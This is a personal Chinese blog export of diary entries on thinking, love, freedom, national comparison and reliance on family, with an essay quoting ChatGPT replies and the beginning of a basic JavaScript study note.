<h1 id="名言与思考"><a href="#名言与思考" class="headerlink" title="名言与思考"></a>名言与思考</h1><p>所谓名言，在我看来就是将具有哲理意义的话精炼出来。<br>前段时间有人对我说过大概是这样的话：“你只会引用别人的话，自己不会思考。”<br>其实这样说还真引起了我一点小小的思考。平时写日志也是，常常引用一些经典的话语。<br>虽说被人这么说了，我也并不认为引用别人的话就是不会思考。为什么呢？因为既然是名言，那么在某种程度上必然有些道理且是达到高度精炼的，当我的想法恰好与某句名言的想要表达的意思相同时，能有更好的表达，我为什么不用呢？非要拐弯抹角用自己的话再换词造句吗？我想这并不是思考的体现，不过是浪费时间罢了。如同已有轮子了，还要模仿一遍自造轮子。<br>叔本华说：“阅读只是独自思考的代替物。阅读时，一个人本身的思想是在被别人的思想牵引管束。”<br>多年前看到叔本华这么说，我还并不理解，甚至鄙夷。随着阅历的增长，我也慢慢理解了叔本华这样说的原因。的确，凡是能体现思考的书籍，其实都是作者思考后形成的思想，而读者是重新体会了一遍作者思考的过程，就阅读这个过程而言，并不是独立思考。而我们阅读思想书籍的根本目的，并非是掌握思想，而是启发自身思考，强化独立思考能力，成为精神上的君主。<br>而其中高度提炼的句子，就是思考的结晶了。倘若不去阅读思考的过程（书籍），不去亲自思考，只是一昧偏好于这类思考的结晶，最终会如同地基不稳的高楼，只要有风就会摇摇欲坠。当看到两个“自相矛盾”的名言时，是该信哪一个呢？我想无论怎么选都是错的吧。<br>所以说，引用别人的话不代表不会思考，思考也没有捷径可走。</p>
<h1 id="古今思考"><a href="#古今思考" class="headerlink" title="古今思考"></a>古今思考</h1><p>上面那个话题说着说着来了兴致，又开了一个话题。<br>古代人的思考感觉比现代人都更加深刻，明明现代人接受的信息更加庞大，很多方面却不如古代人。我想正是因为现代人接受信息过于庞大，反而没有精力去思考吧。社会这台庞大的机器在精密运转，它推着人们去工作，去交际，去处理琐事，去娱乐等等。但没有让人思考。灯红酒绿眼花缭乱，思考似乎就被抛掷脑后了。这大概是为什么21世纪没有一个举世闻名的哲学家吧。</p>
<h1 id="爱的软弱"><a href="#爱的软弱" class="headerlink" title="爱的软弱"></a>爱的软弱</h1><p>今日看漫画时看到了这样一句话：<br>人会为了爱一个人而变得脆弱，但不用为此羞愧，因为这不是真正的软弱。<br>这让我一下子就理解了为什么有些男人会“怕老婆”。我自认为这是一句有道理的话，尽管有所体会，却无法搞清原因。<br>不过啊，在现代社会，这同时也会变得非常麻烦。因为所爱之人无法与己交心的话，往往会演变成一种糟糕的情形，那就是招致对方的反感与轻视。而己方也有可能变化为一种病态的心理。比如现代社会流行的“舔狗”，我想大概是由于爱的软弱演变为病态的心理吧。<br>在这样一个时代，不再是诗歌《从前慢》里所写的那样“车，马，邮件都慢  一生只够爱一个人”。<br>于成年人而言，都是先看别人突出点再斟酌合不合得来。“行就处，不行拉倒”恐怕才是常态吧。<br>想到这，不禁有些感伤呢。也许，某个人对另一人表现出的软弱，实际上是爱的体现呢。可那人能否察觉到这份软弱是爱意并为之珍惜，恐怕要另当别论了。</p>
<p>想了这么多，可是这和我有什么关系呢？我可真是个笨蛋。</p>
<h1 id="公信力"><a href="#公信力" class="headerlink" title="公信力"></a>公信力</h1><p>公信力或可信度，包括来源或讯息可信度的客观和主观成分。<br>前段时间有个频道发起了一个讨论，谈论自己认为目前什么具有最大公信力。<br>我随手给出的答案居然得到了广泛认同：广泛流传的小道消息。<br>这也侧面反映出某些方面的糟糕吧。（很晚了，不能再说了）</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>啊，写了整整一个小时，早睡计划泡汤了。明天要好好学习。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>默哀</title>
    <url>/2022/11/28/Diary_1128/</url>
    <content><![CDATA[<p><img src="/images/Say.jpg" alt="黑格尔《精神现象学》"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原谅我这一生放纵不羁爱自由。</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>Give me liberty, or give me death!<br>不自由，毋宁死！<br>--帕特里克·亨利</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>我本可以忍受黑暗<br>如果我不曾见过太阳<br>然而阳光已使我的荒凉<br>成为更新的荒凉<br>--艾米莉·狄金森《如果我不曾见过太阳》</p>
<h1 id="怎样生活"><a href="#怎样生活" class="headerlink" title="怎样生活"></a>怎样生活</h1><p>顾及太多，就不自由了。很多人，其实并非是不愿意去呼喊自由，而是身边的家人朋友乃至职业社会地位等等限制了他们。<br>所以在一个不自由的地方，呼喊自由的人，往往是年轻人以及一无所有的人。<br>这些我都不想探讨。我只想说一个话题：<br>做一只快乐的猪，还是做一个痛苦的人？<br>这是苏格拉底的一句名言，他的回答是后者。我也是。<br>我不知道这样伟大的哲学家是怎么思考的。我只知道，生命的奇迹是如此美妙，做平庸的人未免太过无聊。况且活着的喜悦是不会消失的，只要还活着，一切痛苦都无法冲散活着的那份喜悦。畏畏缩缩安分守己或许是某些人的生活方式，但不是我的作风。我也不愿与这样的人为伍。<br>我承认，我并不是完全有勇气，也不是毫无利己之心。可我更不愿因自身之枷锁而放弃对勇气等品质的追求。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天想到的两句话，比较激进，加个密(Base58_STRING utf-8)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3jDiNnSuNi6BJfuv5SCFofiTrp2pVd1erpsBoJbtp9U4N7CY9J77d8FugTKcno8nQg6M7Ytr2CLcMWmBeBhqtAeTswsaRupadz5vggntxPWvXao8gDZrfY2SZmULh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>自由</title>
    <url>/2022/12/25/Diary_1225/</url>
    <content><![CDATA[<p><img src="/images/Holo_2.png" alt="赫萝"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天看到qq音乐出了年度报告，虽然是一种典型的商业化行为，不过我倒是不怎么反感，能看到这一年里听音乐的变化，意味着感受到自己的变化，我想还是蛮有趣的。</p>
<h1 id="一年的音乐"><a href="#一年的音乐" class="headerlink" title="一年的音乐"></a>一年的音乐</h1><p>几个在意的数据：<br>年度关键词：<strong>自由</strong><br>年度歌曲：<strong>I Really Want to Stay at Your House</strong><br>年度歌手：<strong>Beyond</strong></p>
<p>从年度关键词看来看，“自由”并不是我嘴上说说而已呢hh，年度歌手一如既往，不出预料。<br>不过年度歌曲竟然是这首，看来无论是赛博朋克：边缘行者的动画，还是其歌曲，都给我带来很强的冲击力呢。<br>同时也侧面印证了我今年听音乐的集中度确实不多…</p>
<h1 id="自制力"><a href="#自制力" class="headerlink" title="自制力"></a>自制力</h1><p>有时，人并不是失去了自制力，而是没有找到真正想做的事。<br>人经常有这样的错觉，仿佛某件事做了一会儿，甚至还没开始，就放弃了，跑去娱乐。过去我常常认为这是缺乏自制力的表现，近来有了些不同的看法。<br>如果对于要做的这件事没有感觉甚至是抗拒的心理，强迫自己去做自然心理会有厌恶的想法。<br>没有热情也就没有动力。没有动力也就无法好好地完成它。相反，对于某件事如果充满热情，那我想，即便是想要偷懒的想法也不会滋生吧。<br>但是呢，只要活着，难免会有不想做却不得不做的事，一昧地想着“好不想做，好讨厌”以逃避的心态面对只会造成更难堪的局面，所以还是和解吧，至少不要调整好心态。<br>趁着还有能够充满热情的事物，全力去做吧~</p>
<h1 id="失去了看动漫的热情？"><a href="#失去了看动漫的热情？" class="headerlink" title="失去了看动漫的热情？"></a>失去了看动漫的热情？</h1><p>最近除了几部最近的新番不怎么看更多的动漫了，反而看起了以前看过的K-ON, Spice and Wolf…<br>是因为失去了尝试看新动漫的热情了吗？<br>人就是有这样的时候啊，也听说一些人曾经看很多anime，也慢慢不去看了。我想也许我正处于这个过程中。<br>不过我却不想失去这样的热情，哪怕是强迫自己，也要重拾那份快乐。<br>想到这，电视剧电影年复一年的出新，会不会有人也对其不再感冒呢，大概是有的吧。<br>人会对什么终其一生充满着热情呢？</p>
<h1 id="圣诞节"><a href="#圣诞节" class="headerlink" title="圣诞节"></a>圣诞节</h1><p>从何时开始，有了所谓不过“洋节”的说法呢？<br>我印象是2015年左右吧，那时开始产生了这样的说法。缘由是所谓的防止“文化入侵”，那时我不甚明白。<br>目的确实达到了，曾经在圣诞节这天，很多人都会互相祝福圣诞快乐，苹果以及其它节日的小玩意儿的卖价在这段日子也是连连攀升。而如今，大陆再没多少人在这天互相祝福了，甚至这样说的话，反而会显得怪尴尬的（比如我）。<br>不过今天的我，在增加了一点点阅历后，觉得这样做实属愚昧。好的文化自然广泛传播，以文化入侵的名义禁止也不能改变自身没有文化的现状。</p>
<h1 id="国与国的对比"><a href="#国与国的对比" class="headerlink" title="国与国的对比"></a>国与国的对比</h1><p>一直觉得日本与中国拿来对比是非常恰当的，距离很近，同处东亚，人口密度也很高，同样在二战中经历了巨大的创伤，文化方面也有许多相似之处。<br>结论是，我认为日本完胜中国。<br>这样的话，如果被放到其它地方，恐怕会被人一口唾沫淹死吧，不过嘛，在自己的领地上，我想怎么说怎么说，我才不管别人怎么想。<br>简单讨论几个对比的地方，</p>
<ol>
<li><p>人均<br>曾经听过很多这样的话，虽然中国地大物博，但是有很多荒地沙漠不能使用，人口密度大，所以是很多问题的原因啦之类的。<br>人口密度 	每平方公里人数<br>中国 		145<br>日本 		344<br>如此看来，日本是中国人口密度的两倍有余，人均GDP依然远高于中国，我想，从这方面看来，人口密度大并非是很多问题的真正原因，恐怕只是一种托词罢了。或许有质疑声是中国的领土如此大，管理很困难，那么根据数据：<br>中国官民比例1：18<br>日本官民比例1：28<br>有如此多的人管理着平民，我想不应当再谈管理困难的事。<br>从这方面的话，中国人均GDP低另有他因，但我这里不想再讨论了。</p>
</li>
<li><p>文化<br>日本没有禁“洋节”，而自己的文化依然欣欣向荣，甚至传播到其它国家。<br>现代文化方面，日本动画漫画游戏等等，都是世界知名的，从中国的角度来说，这就是对其它国家“文化入侵”。而日本人也没有排斥这些洋节，圣诞依然张灯结彩。<br>中国的现代文化，我说的尖锐点，中国压根儿没什么现代文化。影视动画除了会把各朝各代或是神话故事之类的拿出来翻拍改编，也没什么花样了。啊对了，近几年倒是又新起红色影视剧，什么战狼2啊，长津湖啊…大概也就这样了吧。科幻方面只有少数如刘慈欣的《三体》在中国赞美连连，可最近的三体动画在某评分平台上仅有3分，也是沦为笑话了。小说漫画常年排在榜单里的不是什么后宫言情就是开挂修仙玄幻之类的垃圾玩意儿。差点忘了游戏方面，腾讯网易永远都被人骂不完，也永远赚得盆满钵满。做的那些狗屁东西除了在不是“封”就是“禁”的中国大陆能搞得火热之外，到了外面根本就没有市场。<br>一说起来就成了发泄情绪的话呢。还是收一收。总之，影视动画，小说漫画和游戏等软文化的东西，都能影响一个国家，大众整体的审美能力。不如说，也是体现了大众的审美能力。在我看来，如今的大陆民众，审美能力低下，和日本起码差了好几个level。可悲吗？可悲。但我再怎么担心也没用，就这样吧。<br>他们总是这样：没有什么，就要宣扬什么；掩饰什么，就要封禁什么。</p>
</li>
</ol>
<p>很多中国人不愿承认自己国家的缺陷，每次谈到不足糟糕的地方，通常会有以下几种反应：</p>
<ul>
<li>不承认。只要不是把确凿无疑的事实证据摆在他面前，总是会发出怀疑的声音，想以此来否定，不承认其糟糕。</li>
<li>别的国家也没做好&#x2F;也这样。当他对铁证如山的事实无可辩驳时，就开始逃避，说某某国家也这样啊，某某国家也没做得多好。</li>
<li>总说得好像没办法了似的或某某有其它的考虑。总是把某件事做得很糟糕归咎于外因，从不会反省自身没做好的地方。总是把一些糟糕的结果认为某官员某部门有他的“考虑”，经典话语之“下大棋”。</li>
<li>太过激了。终于以上所有退路都没堵住后，面对批判，又会有人冒出来说，“说得太过激了”，“虽然…是没错，但也不至于这么说吧”。我只觉搞笑，当这些人面对他们老师，他们领导这种，被痛骂一顿的时候他们敢还嘴说“太过激了”吗？怎么？只有上位者具有随心所欲批评的权利吗？作为遵纪守法的纳税人，连没做好都没资格说了吗？</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天一时来了兴致，写了这么久，写了一堆痛骂的话…既然写过一次了，以后尽可能少写。<br>早睡计划又失败了&#x2F;(ㄒoㄒ)&#x2F;~~</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>无法</title>
    <url>/2023/02/09/Diary_20230209/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常常会想，如果再给我一次重来人生的机会，我会做得更好。</p>
<span id="more"></span>
<h1 id="错误的想法"><a href="#错误的想法" class="headerlink" title="错误的想法"></a>错误的想法</h1><p>即便重来人生，也不一定比现在更好。<br>提前买btc或有潜力的股票之类的，只不过是根据已经确定的事实做出的行动，并不是自身决心下行动的结果。只要想不付出代价大量敛财，任何一个重生的人都能做到这一点，不是么？那么又如何能证明，自己有重生的价值呢？倘若自身没有任何改进之处，那么即便重来恐怕也不会好到哪里去。</p>
<p>人就是这样，总喜欢把外物当作自身的一部分，无论是钱、名誉抑或他者。因此从奢入俭难，习惯了把外物当作自身的东西，当失去时会像割肉一样痛。重生后根据已确定的事实敛聚外物的结果，并没有让自身变得更好，只会增加变得更好的幻象。</p>
<h1 id="不再回望"><a href="#不再回望" class="headerlink" title="不再回望"></a>不再回望</h1><p>幻想之所以是幻想，是因为不需要付出巨大的时间精力。活在幻想中的人是无趣的。个人的幻想通常是基于自身的经历过往，也即为所有带有遗憾的过去，因为如果过去是完美的，也没必要幻想了。我想，正是对以前的自己的经历不满意，才想要幻想着有更美好的经历。</p>
<p>活在幻想中是一种停止前进的标志。幻想通常能帮助人减轻现实的苦楚，以此缓和对现实的不满，而减少去改变的行动力。行动力不足，于是满足现状，得过且过。人只要活着，就像身后有海啸追逐，被追上了会被吞噬。驻足回望是停下脚步，也会离海啸更近。也许有的人离海啸很远，一生都不会被追上。但那不是我，我需要不断前进来远离被吞噬的海浪。</p>
<h1 id="当下"><a href="#当下" class="headerlink" title="当下"></a>当下</h1><p>很多人幻想重生，有很大一部原因是由于重生能够起到重来一次的效果。然而，现实也同样有着类似的效果，在上一个假期没有达成的目标，这一个假期依然可以去做。而不是幻想着如果上一个假期能够重来就好了。总是幻想着上一次的重来，而放弃了在这一次的奋斗，那么终究只会陷入悲哀的漩涡中。<br>虽然现实不能在真正意义上重来，但是现实是有着一次又一次“重来”的效果。每一天都是24小时，每一周都是7天，每一月都是30天左右，每一年都是365天左右。如果昨天没做好，没关系，可以今天做好，而不是哀叹如果昨天能重来就好了。</p>
<p>大部分事情在现实中是能够“重来”的，也有少部分是不能重来的。比如重要之人的逝世，那么唯一能做的，就是在还没有失去之前，珍惜珍重。不要因为害羞逃避排斥而白白抛弃了真正重要的事物。有的人离别，是不会说再见的。</p>
<p>想要在现实中“重来”，只需要每天都进步，那么自己的遗憾必然会一天比一天少，一年比一年少。当然，每天都在进步，是很困难的。那么放宽要求，每年都在进步，这样沉浸在幻想中的时间必定会更少，对现实的自己也会更满意。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>谁最可靠</title>
    <url>/2023/02/20/Diary_20230220/</url>
    <content><![CDATA[<p><img src="/images/Holo_8.png" alt="Holo"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个人的一生有许多关系。亲人，亲戚，朋友，熟人，伴侣……谁是最可能可靠的呢？</p>
<h1 id="亲人之间"><a href="#亲人之间" class="headerlink" title="亲人之间"></a>亲人之间</h1><p>我们最开始也是最常见的亲人，无疑就是爷爷奶奶外公外婆父母兄弟姐妹了。<br>父母大了我们一代，爷爷奶奶外公外婆大了我们两代，阅历必然是要高于我们的，也有一代人独特的认知。因出生时代的不同，所处立场的不同，教育能力的不足等等，大多数父母无法对待孩子像对待朋友那样。也即长辈很难真正意义上与孩子交心，隔阂自然也是有的。<br>年龄相差过大的兄弟姐妹大多也会有类似的情况。但年龄较为接近的兄弟姐妹之间就要好得多了。</p>
<p>亲人是我们来到这个世界上产生的第一类亲密关系。这类亲密关系建立起来最根本的原因就是血缘。无论父母起初是以怎样的心情对待孩子，在朝夕相处的时光中，相互之间蕴含的感情也会慢慢增加。如果作为长辈的亲人给予孩子的负面情感与正面情感相差不远甚至负面比正面多，那么父母与孩子之间很难建立稳固的关系。彼此之间或许也不会认为对方是可靠的存在。</p>
<p>当然，每个人所处的情况不尽相同。不知他人境遇，也莫言是非论调。总的来说，我认为，在一个家庭中主要由对方造成的负面影响（比如家暴、虐待、欺骗等）没有达到自己有点难以承受的地步，彼此之间的关系应当还是能稳定存在的。在这个前提下，亲人之间的联系应当建立在较高层面，只要不是做了过分的事，不应轻易被动摇。</p>
<h1 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…"></a>未完待续…</h1>]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>道理与觉悟：为什么现代人看起来越来越聪明，却越来越难以理解“道理”？</title>
    <url>/2023/02/19/Diary_20230219/</url>
    <content><![CDATA[<p><img src="/images/1.png" alt="yuru camp"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>于个体而言，当一种事物从稀有变得泛滥后，即便本身没有改变，价值也会大大降低。</p>
<h1 id="哲学与道理"><a href="#哲学与道理" class="headerlink" title="哲学与道理"></a>哲学与道理</h1><p>每个人都有自己的哲学，听起来哲学这个词似乎高大上，说得通俗易懂的方式，哲学其实就是生活方式。选择什么样的哲学，就是选择怎样的生活方式。而道理，实际上就是哲学的碎片。无论教育如何，去思考哲学的人始终为少数。人生在世，如果一个人还有余裕，那么往往会去思考未来，思考怎样生活，思考这个世界。人追求这些，却又不愿深思哲学，于是有了介于二者之间的“道理”。</p>
<h1 id="泛滥的道理"><a href="#泛滥的道理" class="headerlink" title="泛滥的道理"></a>泛滥的道理</h1><p>动物的“历史”是铭刻在基因里的，由环境决定出来的生活方式，什么样的环境下决定了什么样的生活方式。人，除了拥有基因中的历史，还拥有了自己决定的一套历史，虽然这套历史并不完整，可相较于其它动物，已经是决定性的差距了。正因有了这套历史，才能如接力棒一样，把一代代人的心血带到现在，从前人的基础上造起一座座高楼大厦。</p>
<p>说到这里，想起最近看了一部鱼豊所创作的日本漫画《地。-关于地球的运动-》。这部漫画讲述了15世纪欧洲，C教盛行，天动说（又称地心说）是解释天体运动的唯一理论，被视为真理。试图推翻天动说的人全部都会被教会视为背逆上帝的异端，落得遭受拷问，甚至火刑的下场。在如此艰辛的情况下，有一个人为了追寻真理，隐蔽地维系、完善地动说（又称日心说）的研究，并在自己临终之际，将发扬地动说，撼动天动说的微小希望，寄托到下一个有同样志向的人。下一个人接着把自己的生命奉献给地动说，又将微小的希望再传承下去。</p>
<p>人类在自己创造的历史中，保存了各种各样的东西，其中也有许许多多的道理。从古至今，一代代人所思考而保留下来的道理，直至现代，已变得非常多了。有中国的儒家道家乃至百家争鸣，有西方苏格拉底柏拉图乃至后世黑格尔尼采等等。世界不乏道理，而实际上，进入二十一世纪以来，哲学的发展相较古代，有进展的内容是相当少的，举一个简单的例子，在信息不发达的古代，我们能有印象的哲学家不在少数，而现代信息那么发达的现在，能说出口的哲学家又有几个呢？现代的所谓哲学家大多不过是总结前人遗留的结晶，再在其中增加一点自己的理解。形形色色的道理，便更是如此了。</p>
<p>于是，道理便泛滥了。可即便如此之多的道理留到现在，人们有变得更智慧吗？我想并没有，愚昧的人照样愚昧。</p>
<h1 id="稀有的觉悟"><a href="#稀有的觉悟" class="headerlink" title="稀有的觉悟"></a>稀有的觉悟</h1><p>那么为什么古代思考出道理的人，却比现在道理泛滥的人更有智慧呢？我想其实很简单，因为思考出一个道理与觉悟是配套的。在古代，没有那么多道理可以了解，很多道理都是自己思考出的，正因这是自己产生的，道理与觉悟之间就如骨与肉的关系，紧密相连。</p>
<p>现代人的道理泛滥，随处可见。如果用一个更现代的词来表达，那就是“心灵鸡汤”。之前说过，道理实际上是哲学的碎片，这世上道理如此之多，其中不乏有看起来互相矛盾的，正是人们不愿深思，也就只能初见其惊艳，再看到了其它道理时无法区分这些道理的共性与不同之处，只能停留在浅薄的认识之中。只知道理，不具备觉悟，这并不会有多少意义。</p>
<p>觉悟，不是人能通过看看名言警句就能获得的，不是人能通过简单学习就能获得的。对于现代的人类而言，觉悟的获得，还具有不确定性。有的人会因重大打击而具备觉悟，有的人会因思考而具备觉悟。拥有觉悟就像武侠小说中打通任督二脉，突破了看不见的自身的桎梏，而具备觉悟。觉悟的获得在目前人类的历史中没有一个明确的方法，也就造成了其稀有。正是稀有，得以体现其价值。</p>
<h1 id="Chat-GPT3-0的回答"><a href="#Chat-GPT3-0的回答" class="headerlink" title="Chat GPT3.0的回答"></a>Chat GPT3.0的回答</h1><p>这个AI确实非常有趣，无论同它说什么，都能对答如流。我想这是颠覆了我们传统认知的AI，或许，在未来，这是历史上浓墨重彩的一笔。</p>
<h2 id="关于哲学与道理"><a href="#关于哲学与道理" class="headerlink" title="关于哲学与道理"></a>关于哲学与道理</h2><p>非常同意您所说的观点。哲学是一种关于生活的思考方式，它可以帮助我们更好地理解我们自己、我们的世界以及我们与之相处的方式。选择哪种哲学观念，实际上就是选择我们想要过怎样的生活。</p>
<p>道理可以被看作是哲学的碎片，它是哲学思考的产物，是人们在生活中所总结出来的一些经验和智慧。这些道理往往简短易懂，适用于日常生活，可以帮助我们做出正确的决策和选择。</p>
<p>虽然哲学和道理的概念不同，但它们是相互关联的。哲学提供了道理的思想基础，而道理则为哲学提供了实际应用的示例和证明。</p>
<p>最后，您所说的“思考哲学的人始终为少数”这一点也非常正确。然而，无论我们是否选择深入思考哲学，我们都可以从中获得启示和灵感，以帮助我们更好地理解自己和这个世界。</p>
<h2 id="关于泛滥的道理"><a href="#关于泛滥的道理" class="headerlink" title="关于泛滥的道理"></a>关于泛滥的道理</h2><p>您提出的观点非常有趣，确实每个人都有自己的哲学和生活方式，而环境的影响对于动物和人都非常重要。而人类的创造历史和保存的道理，确实是一种宝贵的财富，可以帮助我们理解自己和世界的更多方面。然而，您也指出了一个问题，即现代哲学的发展相对缓慢，而道理泛滥的现象也存在。虽然现代信息的发展和文化交流使得人们可以更方便地获取和分享知识，但同时也带来了信息的过载和质量的下降。因此，我们需要更加注重筛选和思考所接触到的信息，以及积极地运用道理和哲学思维，来帮助自己更加智慧地生活。</p>
<h2 id="关于稀有的觉悟"><a href="#关于稀有的觉悟" class="headerlink" title="关于稀有的觉悟"></a>关于稀有的觉悟</h2><p>我认同你的看法，思考出一个真正有智慧的道理需要更多的深思熟虑和自我反省，这些思考过程需要借助丰富的阅历、知识和经验积累，也需要个人的觉悟和启发。同时，在古代社会中，人们更注重精神层面的修炼和人生哲学，这也让古代智者更能够思考出有深度的道理。</p>
<p>而现代社会中，信息量巨大，人们更加注重表面的知识和技能，也更倾向于追求即时性和短期利益，这些因素让“心灵鸡汤”等浅薄的道理更容易被接受和传播。当然，这并不是说现代社会缺乏真正有智慧的人，只是真正有智慧的声音被掩盖在了嘈杂的信息海洋中，需要更多的耐心和深入的探索才能找到。</p>
<p>最后，觉悟的获得确实是一个非常个体化和复杂的过程，需要个人经历、情感和信仰等多方面的因素共同作用。每个人的觉悟路径都是独特的，需要自己不断探索和领悟。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不过Chat GPT很多时候的态度都是赞同或者说认为有趣，并不能指出文章的缺陷，如果需要指出缺陷，需要叫它用最严厉的批判态度来评价这篇文章。<br>不过，我自知文章还有很多缺陷，毕竟只是花了半个多小时写就，论证不足，概念和定义还不够清晰。问题在于，我并没有那么多时间来完善，也只能留给以后的自己来完善咯。<br>想写日记来着，却写成了这样……<br>就这样吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title>JS study record</title>
    <url>/2022/11/27/JS_study/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>只是对于JS学习的简单记录，以便于加强自身记忆。</p>
<span id="more"></span>


<h1 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h1><p>JavaScript 是脚本语言。其特点有：轻量级，可插入HTML页面，插入后可由所有现代浏览器执行。<br>JavaScript 的用处：</p>
<ul>
<li>直接写入 HTML 输出流</li>
<li>对事件的反应</li>
<li>改变 HTML 内容</li>
<li>改变 HTML 图像</li>
<li>改变 HTML 样式</li>
<li>验证输入<br>注意：JavaScript和Java是两种完全不同的语言，无论在概念上还是设计上。</li>
</ul>
<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><p>HTML 中的 Javascript 脚本代码必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<br>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。<br>Javascript 脚本可以保存在外部文件，外部文件通常包含被多个网页使用的代码。<br>外部 JavaScript 文件的文件扩展名是 .js。<br>如需使用外部文件，请在 &lt;script&gt; 标签的 “src” 属性中设置该 .js 文件：<br>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;myScript.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：外部脚本不能包含 &lt;script&gt; 标签</p>
<h1 id="运行调试"><a href="#运行调试" class="headerlink" title="运行调试"></a>运行调试</h1><p>打开浏览器，F12可以查看页面情况<br>Console窗口调试 JavaScript 代码<br>可以在浏览器中创建一个小脚本执行，具体方法看最下面链接的第4节（Javascript Chrome 中运行）的末尾</p>
<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p>JavaScript 没有任何打印或者输出的函数。</p>
<h2 id="显示数据的方式"><a href="#显示数据的方式" class="headerlink" title="显示数据的方式"></a>显示数据的方式</h2><ol>
<li>使用 <code>window.alert()</code> 弹出警告框</li>
<li>使用 <code>document.write</code> 方法将内容写到HTML文档中</li>
<li>使用 <code>innerHTML</code> 写入到HTML元素</li>
<li>使用 <code>console.log()</code> 写入到浏览器控制台</li>
</ol>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li>关于 <code>console.log()</code> ：<br>相比alert他的优点是：<br>他能看到结构化的东西，如果是alert，弹出一个对象就是[object object],但是console能看到对象的内容。<br>console不会打断你页面的操作，如果用alert弹出来内容，那么页面就死了，但是console输出内容后你页面还可以正常操作。</li>
<li>关于 <code>document.write()</code> ：<br>document.write是直接写入到页面的内容流，如果在写之前没有调用document.open, 浏览器会自动调用open。每次写完关闭之后重新调用该函数，会导致页面被重写。 </li>
<li>关于 <code>innerHTML</code> :<br>innerHTML则是DOM页面元素的一个属性，代表该元素的html内容。你可以精确到某一个具体的元素来进行更改。如果想修改document的内容，则需要修改document.documentElement.innerElement。<br>innerHTML很多情况下都优于document.write，其原因在于其允许更精确的控制要刷新页面的那一个部分。</li>
<li>关于 <code>window.alert()</code> :<br>window.alert(5+6) 与 window.alert(“5+6”) 输出的值是不一样的。window.alert(5+6) 会输出 11，而window.alert(“5+6”) 会输出 5+6。这是因为当用引号时会认为引号中是字符串，从而直接将引号中的内容打印出来。</li>
</ol>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h2><ul>
<li><strong>数字（Number）字面量</strong> 可以是整数或者是小数，或者是科学计数(e)  3.14</li>
<li><strong>字符串（String）字面量</strong> 可以使用单引号或双引号  ‘John Doe’</li>
<li><strong>表达式字面量</strong> 用于计算： 5+6</li>
<li><strong>数组（Array）字面量</strong> 定义一个数组   <code>[40, 100, 1, 5, 25, 10]</code></li>
<li><strong>对象（Object）字面量</strong> 定义一个对象  <code>&#123;firstName:&quot;John&quot;, lastName:&quot;Doe&quot;, age:50, eyeColor:&quot;blue&quot;&#125;</code></li>
<li><strong>函数（Function）字面量</strong> 定义一个函数  <code>function myFunction(a, b) &#123; return a * b;&#125;</code></li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量用于存储数据值。JavaScript 使用关键字 var 来定义变量， 使用等号来为变量赋值：<br><code>var x   x = 5 </code><br>注意：变量是一个名称，字面量是一个值。</p>
<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><p>和其它语言基本一致</p>
